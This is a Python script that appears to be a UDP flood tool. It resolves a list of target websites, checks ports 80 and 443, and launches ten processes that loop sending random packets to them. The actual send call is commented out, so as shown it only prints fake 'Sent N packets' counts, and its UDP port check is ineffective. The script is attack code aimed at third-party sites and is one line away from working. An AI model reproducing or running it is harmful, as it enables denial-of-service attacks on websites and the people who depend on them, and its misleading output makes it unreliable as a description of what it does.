import time
import socket
import random
import multiprocessing

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

used_random_ports = [80, 443]

port_value = random.choice(used_random_ports)

# Open file with hosts
with open('sites.txt') as f:
    sites = f.readlines()

def get_clean_checked_all_ports(clean_ip):
    clean_checked_all_ports = []
    for port in used_random_ports:
        for ip in clean_ip:
            location = (ip, port)
            result_of_check = sock.connect_ex(location)
            if result_of_check == 0:
                print("Port {} is open for ip {}".format(port, ip))
                if(ip not in clean_checked_all_ports):
                    clean_checked_all_ports.append(ip)
            else:
                print("Port {} is not open for ip {}".format(port, ip))
    return clean_checked_all_ports

def dns_resolve():
    global sent, clean_ip, clean_checked_all_ports, clean_socket_address
    ips = []
    print("Targeted sites: \n")

    for site in sites:
        site = site.replace("http://", "")
        site = site.replace("https://", "")
        site = site.replace("www.", "")
        site = site.replace(",", "")
        site = site.replace('"', "")
        site = site.replace("'", "")
        site = site.replace("\n", "")
        site = site.replace("\t", "")
        site = site.strip()
        if site[-1] == "/":
            site = site[:-1]
        print('"' + site + '",')
        try:
            ips.append(socket.gethostbyname(site))
        except:
            print(f"Could not resolve:  {site} ")

    port = 1
    sent = 0

    # remove duplicates
    clean_ip = []
    [clean_ip.append(x) for x in ips if x not in clean_ip]
    print(f"Amount of unique IPs {len(clean_ip)}")
    
    clean_checked_all_ports = get_clean_checked_all_ports(clean_ip)
    print(clean_checked_all_ports)

dns_resolve()


def send_packets():
    while True:
        global sent, port_value
        for ip in clean_checked_all_ports:
            port_value = random.choice(used_random_ports)
            # sock.sendto(bytes, (ip, port_value))
            print("Sent {} packets to {} thought port: {} size {}".format(sent, ip, port_value, packet_size))
            sent = sent + 1
            # port = port + 2
            # if port > 65534:
            #     port = 1
            time.sleep(0.001)

# Create multithreading job list
process_list = []
for i in range(10):
    packet_size = random.randint(10, 20)
    bytes = random._urandom(packet_size)

    p = multiprocessing.Process(target=send_packets)
    p.start()
    process_list.append(p)

for process in process_list:
    process.join()